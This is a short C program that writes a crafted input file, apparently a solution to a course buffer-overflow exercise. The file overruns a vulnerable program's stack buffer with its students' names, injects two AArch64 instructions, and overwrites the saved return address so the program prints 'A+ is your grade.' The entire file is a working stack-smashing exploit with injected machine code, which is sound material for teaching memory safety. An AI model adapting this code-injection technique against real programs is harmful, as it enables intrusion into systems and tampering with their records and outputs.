#include <stdio.h>

int main(void)
{
    FILE *psFile;
    unsigned long ulData1;
    unsigned int uiData2;
    unsigned int uiData3;

    ulData1 = 0x42006c; /* address to the instructions below; */
    uiData2 = 0x10000041; /* adr x1, 0x420074 */
    uiData3 = 0x17FF8201; /* b 0x400888 */

    psFile = fopen("dataAplus", "w");

    /* buf[0 - 17] */
    fprintf(psFile, "Maxwell and Melody");
    /* buf[18-19] */
    fprintf(psFile, "%c", '\0');
    fprintf(psFile, "%c", '\0');
    /* buf[20-23] */
    fwrite(&uiData2, sizeof(unsigned int), 1, psFile);
    /* buf[24-27] */
    fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
    /* buf[28-45] */
    fprintf(psFile, "A+ is your grade.\n");
    /* buf[46-47] */
    fprintf(psFile, "%c", '\0');
    fprintf(psFile, "%c", '\0');
    /* buf[48-55] (x30) */
    fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
    /* buf[56] (newline in unused memory) */
    fprintf(psFile, "%c", '\n');
    return 0;
}